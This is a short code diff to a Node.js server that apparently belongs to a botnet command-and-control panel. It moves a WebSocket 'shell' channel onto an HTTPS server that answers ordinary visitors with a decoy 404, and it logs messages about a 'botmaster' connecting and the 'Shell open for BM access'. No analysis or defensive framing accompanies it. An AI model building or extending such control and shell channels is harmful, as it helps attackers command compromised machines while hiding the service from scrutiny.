@@ -100,7 +100,12 @@ const server = https.createServer(options, (req, res) => {
     }
 });
 
-const wss_shell = new WebSocket.Server({ port: 8080 });
+const wss_server = https.createServer(options, (req, res) => {
+    console.log("404.")
+    res.writeHead(404, { 'Content-Type': 'text/plain' });
+    res.end('Not Found');
+});
+const wss_shell = new WebSocket.Server({ server: wss_server });
 
 wss_shell.on('connection', (ws, req) => {
     console.log('Nuevo botmaster conectado');
@@ -130,6 +135,10 @@ wss_shell.on('connection', (ws, req) => {
     });
 });
 
+const SHELL_PORT = 8080;
+wss_server.listen(SHELL_PORT, () => {
+    console.log("Shell open for BM access")
+})
 
 const wss = new WebSocket.Server({ server });
 
